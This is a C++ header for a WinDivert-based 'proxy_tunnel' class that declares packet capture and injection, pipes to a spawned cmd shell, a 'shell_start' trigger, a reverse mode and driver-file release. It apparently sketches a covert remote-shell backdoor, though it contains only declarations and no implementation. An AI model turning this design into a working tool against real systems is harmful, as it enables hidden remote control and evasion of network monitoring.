#pragma once
#include <winsock2.h>
#include <windows.h>
#include <sstream>
#include <iostream>
#include <fstream>
#include <process.h>
#include <ws2tcpip.h>
#include "windivert.h"

using namespace std;

#define SHELL_START "shell_start"
#define FILE_SIZE 1024	// better less than 1460(MSS)

class proxy_tunnel
{
private:
	char last_cmd[MAX_PATH];

	// shell用管道结构体
	HANDLE m_std_in_rd = NULL;
	HANDLE m_std_in_wr = NULL;
	HANDLE m_std_out_rd = NULL;
	HANDLE m_std_out_wr = NULL;
	HANDLE m_read_thread = NULL;
	PROCESS_INFORMATION m_proc_info;
	UINT m_thread_id;
	bool m_use_crypt = false;
	bool m_reverse_mode = false;
	DWORD m_client_port;

protected:
	HANDLE m_divert_handle;
	shared_ptr<char[]> m_packet_template;
	UINT m_template_packet_len;
	shared_ptr<WINDIVERT_ADDRESS> m_addr_template;
	PVOID m_laddr;
	PVOID m_raddr;
	UINT16 m_lport;
	UINT16 m_rport;

public:
	proxy_tunnel();
	~proxy_tunnel();
	void start();
	void set_reverse_mode(bool mode);
	void set_lport(UINT16 lport);
	void set_rport(UINT16 rport);
	virtual bool set_laddr(std::string laddr) = 0;
	virtual bool set_raddr(std::string raddr) = 0;

private:
	BOOL init_divert(const char* filter);															// 初始化windivert
	void run_shell();																				// 打开shell
	void init_shell();
	void exit_shell();																				// 退出shell
	bool release_sysfile();

	void build_packet_template();
	void build_addr_template();
	void print_ip_info(PVOID ip_header);
	bool recv_data_packet(PVOID packet_buf, PUINT payload_len, PVOID* payload_buf);
	void set_packet_template(PVOID packet, UINT recv_len);										// 格式化标准发送包
	void send_data_packet(const char* payload_buf, int payload_len = 0) ;						// 发送数据包

	static unsigned WINAPI read_from_cmd(void* ptr);												// 读取cmd输出线程
};